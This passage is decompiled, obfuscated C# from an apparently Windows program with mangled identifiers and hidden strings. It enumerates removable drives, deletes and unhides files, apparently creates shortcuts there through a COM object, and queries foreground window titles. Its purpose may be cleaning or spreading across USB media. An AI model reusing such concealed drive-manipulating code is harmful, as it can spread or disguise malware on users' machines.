      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0002, new Size(413, 240));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0002, 2);
      \u0012\u0002.\u007E\u007F\u0004((object) obj0.\u0002, false);
      \u0007\u0002.\u007E\u0007\u0004((object) obj0, new Size(5, 13));
      \u0007\u0002.\u0008\u0004((object) obj0, new Size(434, 488));
      \u0012\u0002.\u001B\u0004((object) obj0, false);
      \u0014\u0002.\u007E\u0087\u0004((object) \u0013\u0002.\u0086\u0004((object) obj0), new Control[3]
      {
        (Control) obj0.\u0001,
        (Control) obj0.\u0001,
        (Control) obj0.\u0002
      });
      \u0015\u0002.\u0088\u0004((object) obj0, FormBorderStyle.FixedSingle);
      \u0012\u0002.\u001E\u0004((object) obj0, false);
      \u0012\u0002.\u001D\u0004((object) obj0, false);
      \u0012\u0002.\u001C\u0004((object) obj0, false);
      \u0016\u0002.\u0089\u0004((object) obj0, FormStartPosition.CenterScreen);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0, \u0006.\u0007.\u001F(2001));
      if (\u0018.\u007E\u0084((object) \u001E.\u007E\u0003\u0002((object) obj0)) == 0)
        \u000F\u0002.\u007E\u0012\u0004((object) obj0, \u0006.\u0007.\u001F(2014));
      try
      {
        \u0012\u0002.\u0081\u0004((object) obj0, true);
      }
      catch
      {
      }
      \u0012\u0002.\u007E\u001F\u0004((object) obj0.\u0001, false);
      \u0012\u0002.\u007E\u001F\u0004((object) obj0.\u0002, false);
      \u0012\u0002.\u001F\u0004((object) obj0, false);
      \u009B.\u007E\u0081\u0003((object) obj0.\u0005);
      \u009B.\u007E\u0081\u0003((object) obj0.\u0006);
      \u0007\u0002.\u000E\u0004((object) obj0, new Size(419, 264));
      \u008B\u0002.\u007E\u0005\u0005((object) obj0.\u0002, DockStyle.Fill);
      \u008B\u0002.\u007E\u0005\u0005((object) obj0.\u0001, DockStyle.Fill);
    }

    static void \u0001([In] bool obj0, [In] \u0003.\u0005 obj1) => obj1.\u0004 = obj0;

    static unsafe int \u0001([In] \u0003.\u0004.\u0003 obj0, [In] \u0003.\u0004.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      try
      {
        int val1 = obj2;
        int val2_1 = 32768;
        if (val2_1 != 0)
        {
          int val2_2 = val2_1 - obj0.\u0002;
          int num = Math.Min(val1, val2_2);
          val2_1 = \u0006.\u0007.\u0001(obj1);
          val1 = num;
        }
        int num1 = Math.Min(val1, val2_1);
        while (true)
        {
          obj2 = num1;
          int num2;
          do
          {
            *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
            num2 = obj2;
            if (true)
            {
              int num3 = *(int*) ((IntPtr) voidPtr + 4);
              if (num2 > num3)
                goto label_4;
            }
            else
              goto label_2;
          }
          while (false);
          goto label_7;
label_2:
          num1 = num2;
        }
label_4:
        *(int*) voidPtr = \u0006.\u0007.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
        {
          *(int*) voidPtr = *(int*) voidPtr + \u0006.\u0007.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
          goto label_8;
        }
        else
          goto label_8;
label_7:
        *(int*) voidPtr = \u0006.\u0007.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
label_8:
        obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
        obj0.\u0002 += *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u0003.\u0004.\u0003 obj3 = obj0;
        \u0003.\u0004.\u0002 obj4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) obj3, (object) obj4, (object) local3);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] IntPtr obj0, [In] ref int obj1);

    static unsafe int \u0001([In] \u0003.\u0004.\u0004 obj0, [In] \u0003.\u0004.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      int index;
      try
      {
        if ((index = \u0006.\u0007.\u0001(obj1, 9)) < 0)
        {
          *(int*) ((IntPtr) voidPtr + 12) = \u0006.\u0007.\u0001(obj1);
          index = \u0006.\u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
          num = (int) obj0.\u0001[index];
          if (num >= 0 && (num & 15) <= *(int*) ((IntPtr) voidPtr + 12))
          {
            \u0006.\u0007.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
            *(int*) ((IntPtr) voidPtr + 16) = -1;
        }
        else if ((num = (int) obj0.\u0001[index]) < 0)
        {
          *(int*) voidPtr = -(num >> 4);
          *(int*) ((IntPtr) voidPtr + 4) = num & 15;
          if ((index = \u0006.\u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
          {
            num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
            \u0006.\u0007.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0006.\u0007.\u0001(obj1);
            do
            {
              index = \u0006.\u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
              num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
              if ((num & 15) <= *(int*) ((IntPtr) voidPtr + 8))
                \u0006.\u0007.\u0001(obj1, num & 15);
              else
                goto label_8;
            }
            while (false);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
            if (true)
              goto label_15;
label_8:
            *(int*) ((IntPtr) voidPtr + 16) = -1;
          }
        }
        else
        {
          \u0006.\u0007.\u0001(obj1, num & 15);
          *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u0003.\u0004.\u0004 obj2 = obj0;
        \u0003.\u0004.\u0002 obj3 = obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 16);
    }

    static void \u0001(
      [In] string obj0,
      [In] string obj1,
      [In] \u0008.\u0008 obj2,
      [In] \u0008.\u0005 obj3,
      [In] byte[] obj4,
      [In] string obj5)
    {
      try
      {
        ReportingService reportingService1 = new ReportingService(obj2.\u0003);
        if (obj2.\u0001 != null)
        {
          \u008C\u0002 obj = \u008C\u0002.\u007E\u0006\u0005;
          ReportingService reportingService2 = reportingService1;
          IWebProxy webProxy = obj2.\u0001;
          if (true)
            obj((object) reportingService2, webProxy);
        }
        obj3(reportingService1.UploadReport2(obj2.\u0002, obj4, obj0, obj1, obj5));
      }
      catch (Exception ex)
      {
        obj3(\u001D.\u0099(\u0006.\u0007.\u001F(2035), \u001E.\u007E\u0004\u0002((object) ex)));
      }
    }

    static bool \u0001([In] \u0003.\u0004.\u0007 obj0)
    {
      bool flag;
      try
      {
        do
        {
          do
          {
            if (true)
              goto label_5;
label_3:
            continue;
label_5:
            int num1 = obj0.\u0001 < 16384 ? 1 : 0;
            int num2;
            while (true)
            {
              num2 = num1 == 0 ? 1 : 0;
              if (false)
                num1 = num2;
              else
                break;
            }
            flag = num2 != 0;
            goto label_3;
          }
          while (false);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0007 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static bool \u0001() => \u0006.\u0007.\u0001().\u0001 == (byte) 1;

    static string \u0001()
    {
      string str;
      try
      {
        str = \u008B.\u009D\u0002();
      }
      catch
      {
        str = \u0006.\u0007.\u001F(2052);
      }
      return str;
    }

    static unsafe void \u0001([In] \u0003.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      DriveInfo driveInfo;
      string[] strArray1;
      string str;
      Exception exception1;
      string[] strArray2;
      string path;
      DirectoryInfo directoryInfo;
      Exception exception2;
      Exception exception3;
      DriveInfo[] driveInfoArray;
      try
      {
        if (true)
        {
          obj0.\u0001 = true;
          while (obj0.\u0001 != null)
          {
            \u001A obj = \u001A.\u0095;
            if (true)
              obj(1);
          }
          driveInfoArray = \u0083.\u0080\u0002();
        }
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < driveInfoArray.Length)
        {
          driveInfo = driveInfoArray[*(int*) voidPtr];
          try
          {
            if (true)
            {
              if (\u0087.\u007E\u0084\u0002((object) driveInfo))
              {
                if (\u0089.\u007E\u009A\u0002((object) driveInfo) == DriveType.Removable | \u0089.\u007E\u009A\u0002((object) driveInfo) == DriveType.CDRom)
                {
                  if (\u008A.\u009B\u0002(\u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), obj0.\u0001)))
                  {
                    \u008D.\u0004\u0003(\u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), obj0.\u0001), FileAttributes.Normal);
                    \u008D\u0002.\u0007\u0005(\u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), obj0.\u0001));
                  }
                  strArray1 = \u008E.\u0005\u0003(\u001E.\u007E\u009D((object) driveInfo));
                  *(int*) ((IntPtr) voidPtr + 4) = 0;
                }
                else
                  goto label_23;
              }
              else
                goto label_23;
            }
            while (*(int*) ((IntPtr) voidPtr + 4) < strArray1.Length)
            {
              str = strArray1[*(int*) ((IntPtr) voidPtr + 4)];
              try
              {
                \u008D.\u0004\u0003(str, FileAttributes.Normal);
                if (\u0015.\u007E\u001F((object) \u001E.\u007E\u009C((object) str), \u0006.\u0007.\u001F(786)))
                  \u008D\u0002.\u0007\u0005(str);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception1 = ex;
                global::\u0006.\u0006();
              }
              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            }
            strArray2 = \u008E.\u0006\u0003(\u001E.\u007E\u009D((object) driveInfo));
            *(int*) ((IntPtr) voidPtr + 8) = 0;
            while (*(int*) ((IntPtr) voidPtr + 8) < strArray2.Length)
            {
              path = strArray2[*(int*) ((IntPtr) voidPtr + 8)];
              try
              {
                directoryInfo = new DirectoryInfo(path);
                \u008E\u0002.\u007E\u0008\u0005((object) directoryInfo, FileAttributes.Normal);
                directoryInfo = (DirectoryInfo) null;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception2 = ex;
                global::\u0006.\u0006();
              }
              *(int*) ((IntPtr) voidPtr + 8) = checked (*(int*) unchecked ((IntPtr) voidPtr + 8) + 1);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception3 = ex;
            global::\u0006.\u0006();
          }
label_23:
          *(int*) voidPtr = checked (*(int*) voidPtr + 1);
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[14]
        {
          (object) driveInfo,
          (object) str,
          (object) exception1,
          (object) path,
          (object) exception2,
          (object) exception3,
          (object) *(int*) voidPtr,
          (object) driveInfoArray,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) strArray1,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) strArray2,
          (object) directoryInfo,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static int \u0001([In] Font obj0, [In] Graphics obj1, [In] int obj2, [In] string obj3)
    {
      \u0007.\u0003.\u0001 obj;
      IntPtr num1;
      int num2;
      if (true)
      {
        obj = new \u0007.\u0003.\u0001(new Rectangle(0, 0, obj2, 10000));
        if (true)
        {
          if (true)
          {
            num2 = 3088;
            num1 = \u0004\u0002.\u007E\u0001\u0004((object) obj1);
          }
          else
            goto label_10;
        }
        else
          goto label_7;
      }
      IntPtr num3 = \u0004\u0002.\u007E\u0002\u0004((object) obj0);
      IntPtr num4;
      if (true)
        num4 = num3;
      else
        goto label_8;
label_7:
      num3 = num1;
label_8:
      IntPtr num5 = num4;
      IntPtr num6 = \u0006.\u0007.\u0001(num3, num5);
      int num7 = \u0006.\u0007.\u0001(num1, obj3, -1, ref obj, num2);
      if (false)
        return num7;
      \u0006.\u0007.\u0001(num1, num6);
label_10:
      \u008F\u0002.\u007E\u000E\u0005((object) obj1, num1);
      return obj.\u0004 - obj.\u0002;
    }

    static void \u0001([In] \u0003.\u0005 obj0) => obj0.\u0001 = true;

    static string \u0001([In] string obj0)
    {
      while (true)
      {
        int num;
        if (true)
          num = \u0015.\u007E\u0080((object) obj0, \u0006.\u0007.\u001F(2057)) ? 1 : 0;
        else
          goto label_4;
label_3:
        if (num == 0)
          break;
label_4:
        if (true)
        {
          num = \u0015.\u007E\u001F((object) obj0, \u0006.\u0007.\u001F(2078)) ? 1 : 0;
          if (true)
          {
            if (num != 0)
              return \u0006.\u0007.\u001F(2099);
            break;
          }
          goto label_3;
        }
      }
      return obj0;
    }

    static void \u0001([In] \u0006.\u0006 obj0, [In] \u0004.\u0006 obj1)
    {
      \u0004.\u0006 obj2 = obj0.\u0001;
label_4:
      \u0004.\u0006 comparand = obj2;
      do
      {
        \u0004.\u0006 obj3 = (\u0004.\u0006) \u0001\u0002.\u009C\u0003((Delegate) comparand, (Delegate) obj1);
        \u0004.\u0006 obj4;
        if (true)
          obj4 = obj3;
        obj2 = Interlocked.CompareExchange<\u0004.\u0006>(ref obj0.\u0001, obj4, comparand);
        if (obj2 != comparand)
          goto label_4;
      }
      while (false);
    }

    static int \u0001([In] \u0002.\u0003 obj0, [In] \u0002.\u0003.\u0003 obj1)
    {
label_0:
      string key = \u001E.\u007E\u009B((object) obj1.\u0001.\u0001);
      int num;
      do
      {
        if (true)
        {
          if (true)
          {
            num = obj0.\u0002.ContainsKey(key) ? 1 : 0;
            if (true)
            {
              if (num != 0)
                goto label_9;
            }
            else
              goto label_4;
          }
          else
            goto label_7;
        }
        else
          goto label_0;
      }
      while (false);
      goto label_10;
label_4:
      return num;
label_7:
      int count;
      return count;
label_9:
      return obj0.\u0002[key];
label_10:
      count = obj0.\u0001.Count;
      if (true)
      {
        obj0.\u0001.Add(obj1.\u0001);
        obj0.\u0002.Add(key, count);
        goto label_7;
      }
      else
        goto label_0;
    }

    static bool \u0001([In] \u0003.\u0004.\u0002 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u0001 == obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0002 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u0003.\u0003 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u0003.\u0003 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static bool \u0001([In] \u0004.\u0007 obj0) => obj0.\u0001;

    static void \u0001([In] \u0002.\u0003 obj0, [In] \u0008.\u0003 obj1)
    {
      \u0008.\u0003 obj2 = obj0.\u0001;
label_4:
      \u0008.\u0003 comparand = obj2;
      do
      {
        \u0008.\u0003 obj3 = (\u0008.\u0003) \u0001\u0002.\u009C\u0003((Delegate) comparand, (Delegate) obj1);
        \u0008.\u0003 obj4;
        if (true)
          obj4 = obj3;
        obj2 = Interlocked.CompareExchange<\u0008.\u0003>(ref obj0.\u0001, obj4, comparand);
        if (obj2 != comparand)
          goto label_4;
      }
      while (false);
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] \u0003.\u0003 obj1,
      [In] bool obj2,
      [In] byte[] obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj1.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj3 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj1.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj0 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj1.\u0001.GetMethod(obj2 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]);
        return (ICryptoTransform) method.Invoke(obj1.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u0003.\u0003 obj = obj1;
        byte[] numArray1 = obj3;
        byte[] numArray2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj2;
        \u0006.\u0007.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    static object \u0001([In] string obj0, [In] DriveInfo obj1, [In] \u0003.\u0002 obj2, [In] string obj3)
    {
      Exception exception1;
      object[] objArray1;
      object obj4;
      object[] objArray2;
      string[] strArray1;
      object obj5;
      try
      {
        try
        {
          \u008D\u0002.\u0007\u0005(global::\u0004.\u0004(\u001E.\u007E\u009D((object) obj1), \u001E.\u007E\u009E((object) new FileInfo(obj3)), \u0006.\u0007.\u001F(786)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
        \u0001 obj6 = \u0001.\u0001;
        object obj7 = \u0090\u0002.\u000F\u0005(\u0006.\u0007.\u001F(2172), \u0006.\u0007.\u001F(379));
        string str1 = \u0006.\u0007.\u001F(2193);
        objArray1 = new object[1]
        {
          (object) global::\u0004.\u0004(\u001E.\u007E\u009D((object) obj1), \u001E.\u007E\u009E((object) new FileInfo(obj3)), \u0006.\u0007.\u001F(786))
        };
        object[] objArray3 = objArray1;
        obj4 = obj6(obj7, (System.Type) null, str1, objArray3, (string[]) null, (System.Type[]) null, (bool[]) null);
        global::\u0003 obj8 = global::\u0003.\u0003;
        object obj9 = obj4;
        string str2 = \u0006.\u0007.\u001F(2214);
        objArray2 = new object[1]
        {
          (object) \u0006.\u0007.\u001F(2231)
        };
        object[] objArray4 = objArray2;
        obj8(obj9, (System.Type) null, str2, objArray4, (string[]) null, (System.Type[]) null, false, true);
        global::\u0003 obj10 = global::\u0003.\u0003;
        object obj11 = obj4;
        string str3 = \u0006.\u0007.\u001F(2244);
        objArray2 = new object[1]
        {
          (object) \u0006.\u0007.\u001F(379)
        };
        object[] objArray5 = objArray2;
        obj10(obj11, (System.Type) null, str3, objArray5, (string[]) null, (System.Type[]) null, false, true);
        global::\u0003 obj12 = global::\u0003.\u0003;
        object obj13 = obj4;
        string str4 = \u0006.\u0007.\u001F(2269);
        objArray2 = new object[1];
        object[] objArray6 = objArray2;
        strArray1 = new string[5]
        {
          \u0006.\u0007.\u001F(2282),
          \u009C.\u007E\u0097\u0003((object) obj2.\u0001, \u0006.\u0007.\u001F(1021), \u0006.\u0007.\u001F(2295)),
          \u0006.\u0007.\u001F(2300),
          \u001E.\u007E\u009F((object) new DirectoryInfo(obj3)),
          \u0006.\u0007.\u001F(2329)
        };
        string str5 = \u0091\u0002.\u0010\u0005(strArray1);
        objArray6[0] = (object) str5;
        object[] objArray7 = objArray2;
        obj12(obj13, (System.Type) null, str4, objArray7, (string[]) null, (System.Type[]) null, false, true);
        global::\u0003 obj14 = global::\u0003.\u0003;
        object obj15 = obj4;
        string str6 = \u0006.\u0007.\u001F(2342);
        objArray2 = new object[1]{ (object) obj0 };
        object[] objArray8 = objArray2;
        obj14(obj15, (System.Type) null, str6, objArray8, (string[]) null, (System.Type[]) null, false, true);
        object obj16 = \u0011.\u001A(obj4, (System.Type) null, \u0006.\u0007.\u001F(2359), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        return obj5;
      }
      catch (Exception ex)
      {
        object obj17 = obj5;
        Exception exception2 = exception1;
        object[] objArray9 = objArray1;
        object obj18 = obj4;
        object[] objArray10 = objArray2;
        string[] strArray2 = strArray1;
        \u0003.\u0002 obj19 = obj2;
        DriveInfo driveInfo = obj1;
        string str7 = obj3;
        string str8 = obj0;
        \u0006.\u0007.\u0001(ex, obj17, (object) exception2, (object) objArray9, obj18, (object) objArray10, (object) strArray2, (object) obj19, (object) driveInfo, (object) str7, (object) str8);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7)
    {
      if (false)
        return;
      \u0006.\u0007.\u0001(obj0, new object[7]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7
      });
    }

    static void \u0001([In] object[] obj0, [In] Exception obj1)
    {
      if (false)
        return;
      if (obj1 != null && obj1 is SecurityException)
      {
        do
        {
          if (true)
          {
            if (true)
            {
              if (!\u0095.\u0017\u0003(\u0006.\u0006.\u0001, \u0006.\u0007.\u001F(2368)) || !\u0006.\u0007.\u0001().\u0001((SecurityException) obj1))
                goto label_9;
            }
            else
              goto label_7;
          }
        }
        while (false);
        return;
      }
      goto label_9;
label_7:
      \u0006.\u0007.\u0001().\u0001(obj1, false, false);
      return;
label_9:
      \u0006.\u0007.\u0001(obj1, obj0);
      goto label_7;
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9)
    {
      \u0006.\u0007.\u0001(obj0, new object[9]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9
      });
    }

    static object \u0001([In] \u0006.\u0005 obj0) => obj0.\u0001;

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr \u0001();

    static string \u0001()
    {
      string str1;
      try
      {
        RegistryKey registryKey = \u0092\u0002.\u007E\u0011\u0005((object) Registry.LocalMachine, \u0006.\u0007.\u0001());
        if (false)
          goto label_5;
        else
          goto label_6;
label_3:
        str1 = (string) null;
        goto label_10;
label_5:
        \u009B.\u007E\u0082\u0003((object) registryKey);
        string str2;
        str1 = str2;
        if (false)
          goto label_3;
        else
          goto label_10;
label_6:
        if (registryKey == null)
          registryKey = \u0092\u0002.\u007E\u0011\u0005((object) Registry.LocalMachine, \u0006.\u0007.\u0001());
        if (true)
        {
          if (registryKey != null)
          {
            str2 = (string) \u0093\u0002.\u007E\u0012\u0005((object) registryKey, \u0006.\u0007.\u001F(2373), (object) null);
            goto label_5;
          }
          else
            goto label_3;
        }
        else
          goto label_5;
      }
      catch
      {
        do
        {
          str1 = (string) null;
        }
        while (false);
      }
label_10:
      return str1;
    }

    static void \u0001([In] \u0002.\u0003 obj0, [In] Exception obj1)
    {
      \u000E.\u0004 obj = new \u000E.\u0004(obj0.\u0001, \u0006.\u0007.\u001F(2382));
      try
      {
        System.Type type1 = \u0094\u0002.\u007E\u0013\u0005((object) obj1);
        System.Type type2;
        if (true)
          type2 = type1;
        obj0.\u0001(type2);
        string str1 = \u0006.\u0007.\u001F(2052);
        try
        {
          str1 = \u001E.\u007E\u0004\u0002((object) obj1);
        }
        catch
        {
        }
        \u0095\u0002.\u007E\u0018\u0005((object) obj0.\u0001, \u0006.\u0007.\u001F(2395), str1);
        string str2 = \u001E.\u007E\u0006\u0002((object) \u001E.\u007E\u0005\u0002((object) obj1));
        \u0095\u0002.\u007E\u0018\u0005((object) obj0.\u0001, \u0006.\u0007.\u001F(2408), str2);
        int num1 = \u0096\u0002.\u007E\u001A\u0005((object) str2, ' ');
        string str3 = \u0097\u0002.\u007E\u001B\u0005((object) str2, num1 + 1);
        int num2 = \u0098\u0002.\u007E\u001C\u0005((object) str3, \u0006.\u0007.\u001F(781));
        if (num2 != -1)
          str3 = \u0080.\u007E\u001E\u0002((object) str3, 0, num2);
        \u0095\u0002.\u007E\u0018\u0005((object) obj0.\u0001, \u0006.\u0007.\u001F(2437), str3);
        obj0.\u0001(new \u0006.\u0005((object) obj1, true));
      }
      catch
      {
      }
      finally
      {
        if (obj != null)
          \u009B.\u007E\u007F\u0003((object) obj);
      }
    }

    static bool \u0001([In] \u0001 obj0) => obj0.\u0002;

    static void \u0001([In] \u0003.\u0004.\u0006 obj0)
    {
      try
      {
        if (false)
          return;
        obj0.\u0001 |= 12;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0006 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] long obj0);

    static unsafe bool \u0001([In] \u0003.\u0004.\u0005 obj0, [In] \u0003.\u0004.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
label_1:
      int num1;
      int num2;
      byte num3;
      int num4;
      try
      {
        while (true)
        {
          num1 = obj0.\u0001;
          int num5 = num1;
          int num6;
          while (true)
          {
            int num7;
            switch (num5)
            {
              case 0:
                obj0.\u0002 = \u0006.\u0007.\u0001(obj1, 5);
                if (obj0.\u0002 >= 0)
                {
                  obj0.\u0002 += 257;
                  \u0006.\u0007.\u0001(obj1, 5);
                  obj0.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_40;
              case 1:
                if (true)
                {
                  obj0.\u0003 = \u0006.\u0007.\u0001(obj1, 5);
                  int num8 = obj0.\u0003;
                  int num9 = 0;
                  if (num9 == 0)
                  {
                    if (num8 >= num9)
                    {
                      ++obj0.\u0003;
                      \u0006.\u0007.\u0001(obj1, 5);
                      obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
                      obj0.\u0002 = new byte[obj0.\u0005];
                      obj0.\u0001 = 2;
                      goto case 2;
                    }
                    else
                      goto label_8;
                  }
                  else
                  {
                    num7 = num9;
                    num7 = num8;
                    goto label_24;
                  }
                }
                else
                  goto label_18;
              case 2:
                obj0.\u0004 = \u0006.\u0007.\u0001(obj1, 4);
                if (obj0.\u0004 >= 0)
                {
                  obj0.\u0004 += 4;
                  \u0006.\u0007.\u0001(obj1, 4);
                  if (true)
                  {
                    obj0.\u0001 = new byte[19];
                    obj0.\u0007 = 0;
                    obj0.\u0001 = 3;
                    goto case 3;
                  }
                  else
                    break;
                }
                else
                  goto label_11;
              case 3:
label_19:
                if (obj0.\u0007 < obj0.\u0004)
                {
                  *(int*) voidPtr = \u0006.\u0007.\u0001(obj1, 3);
                  if (*(int*) voidPtr >= 0)
                  {
                    \u0006.\u0007.\u0001(obj1, 3);
                    break;
                  }
                  goto label_15;
                }
                else
                {
                  obj0.\u0001 = new \u0003.\u0004.\u0004(obj0.\u0001);
                  obj0.\u0001 = (byte[]) null;
                  obj0.\u0007 = 0;
                  obj0.\u0001 = 4;
                  goto case 4;
                }
              case 4:
label_23:
                num7 = \u0006.\u0007.\u0001(obj0.\u0001, obj1);
                goto label_24;
              case 5:
label_30:
                *(int*) ((IntPtr) voidPtr + 4) = \u0003.\u0004.\u0005.\u0002[obj0.\u0006];
                num6 = \u0006.\u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
                if (false)
                {
                  num5 = num6;
                  continue;
                }
                goto label_31;
              default:
                goto label_1;
            }
            obj0.\u0001[\u0003.\u0004.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
label_18:
            ++obj0.\u0007;
            goto label_19;
label_24:
            num2 = num7;
            if ((num7 & -16) == 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              obj0.\u0001 = num3 = (byte) num2;
              int num10 = (int) num3;
              numArray[index] = (byte) num10;
              if (obj0.\u0007 != obj0.\u0005)
                goto label_23;
              else
                goto label_22;
            }
            else if (num2 >= 0)
            {
              if (num2 >= 17)
                obj0.\u0001 = (byte) 0;
              obj0.\u0006 = num2 - 16;
              obj0.\u0001 = 5;
              goto label_30;
            }
            else
              goto label_26;
          }
label_31:
          num4 = num6;
          if (num4 >= 0)
          {
            \u0006.\u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
            num4 += \u0003.\u0004.\u0005.\u0001[obj0.\u0006];
            while (num4-- > 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              int num11 = (int) obj0.\u0001;
              numArray[index] = (byte) num11;
            }
            if (obj0.\u0007 != obj0.\u0005)
              obj0.\u0001 = 4;
            else
